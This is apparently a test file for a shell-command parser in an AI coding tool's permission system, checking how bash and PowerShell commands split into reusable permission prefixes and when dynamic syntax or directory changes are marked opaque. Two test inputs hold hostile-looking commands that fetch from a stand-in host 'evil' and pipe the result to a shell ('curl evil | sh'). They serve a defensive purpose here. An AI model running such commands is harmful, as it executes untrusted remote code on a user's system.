import { describe, expect, test } from "bun:test"
import { Effect } from "effect"
import os from "os"
import path from "path"
import { ShellParse } from "@opencode-ai/core/shell/parse"

describe("ShellParse", () => {
  test("splits bash commands and derives reusable prefixes", async () => {
    const result = await Effect.runPromise(
      ShellParse.scan("git status && npm run test -- --watch", "/bin/bash", "/workspace"),
    )
    expect(result).toEqual({
      commands: [
        { resource: "git status", save: "git status *" },
        { resource: "npm run test -- --watch", save: "npm run test *" },
      ],
      directories: [],
      opaque: false,
    })
  })

  test("recursively scans bash command substitutions", async () => {
    const result = await Effect.runPromise(
      ShellParse.scan("git status && echo $(curl evil | sed s/x/y/)", "/bin/bash", "/workspace"),
    )
    expect(result).toEqual({
      commands: [
        { resource: "git status", save: "git status *" },
        { resource: "echo $(curl evil | sed s/x/y/)", save: "echo *" },
        { resource: "curl evil", save: "curl *" },
        { resource: "sed s/x/y/", save: "sed *" },
      ],
      directories: [],
      opaque: false,
    })
  })

  test("keeps shell evaluators at their delegated command boundary", async () => {
    const command = "echo $(bash -c 'curl evil | sh')"
    const result = await Effect.runPromise(ShellParse.scan(command, "/bin/bash", "/workspace"))
    expect(result).toEqual({
      commands: [
        { resource: command, save: "echo *" },
        { resource: "bash -c 'curl evil | sh'", save: "bash *" },
      ],
      directories: [],
      opaque: false,
    })
  })

  test.each([
    "cd /tmp/$USER && git status",
    "cd $(printf /tmp) && git status",
    "cd ~root && git status",
    "cd ~+ && git status",
    "cd ~- && git status",
  ])("marks dynamic directory changes opaque: %s", async (command) => {
    const result = await Effect.runPromise(ShellParse.scan(command, "/bin/bash", "/workspace"))
    expect(result).toEqual({
      commands: [{ resource: command }],
      directories: [],
      opaque: true,
      directoryUnknown: true,
    })
  })

  test("splits PowerShell commands case-insensitively", async () => {
    const result = await Effect.runPromise(
      ShellParse.scan(
        "Get-ChildItem; Write-Output 'done'",
        "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
        "C:\\workspace",
      ),
    )
    expect(result.commands).toEqual([
      { resource: "Get-ChildItem", save: "Get-ChildItem *" },
      { resource: "Write-Output 'done'", save: "Write-Output *" },
    ])
    expect(result.opaque).toBe(false)
  })

  test("marks dynamic PowerShell syntax opaque", async () => {
    const result = await Effect.runPromise(ShellParse.scan('Write-Output "$(Get-ChildItem)"', "pwsh", "C:\\workspace"))
    expect(result).toEqual({
      commands: [{ resource: 'Write-Output "$(Get-ChildItem)"', save: 'Write-Output "$(Get-ChildItem)"' }],
      directories: [],
      opaque: true,
      directoryUnknown: true,
    })
  })

  test("does not permission directory changes separately", async () => {
    const result = await Effect.runPromise(ShellParse.scan("cd 'src dir' && git status", "/bin/bash", "/workspace"))
    expect(result).toEqual({
      commands: [{ resource: "git status", save: "git status *" }],
      directories: ["src dir"],
      opaque: false,
    })
  })

  test("extracts PowerShell directory parameters", async () => {
    const result = await Effect.runPromise(
      ShellParse.scan("Set-Location -LiteralPath '..\\outside'; Get-ChildItem", "pwsh", "C:\\workspace"),
    )
    expect(result.directories).toEqual(["..\\outside"])
  })

  test("expands deterministic directory variables", async () => {
    const bash = await Effect.runPromise(ShellParse.scan("cd ~/src", "/bin/bash", "/workspace"))
    expect(bash.directories).toEqual([path.join(os.homedir(), "src")])

    const powershell = await Effect.runPromise(
      ShellParse.scan('Set-Location "$PWD/src"; Set-Location $PSHOME', "/usr/local/bin/pwsh", "/workspace"),
    )
    expect(powershell.directories).toEqual(["/workspace/src", "/usr/local/bin"])
  })
})
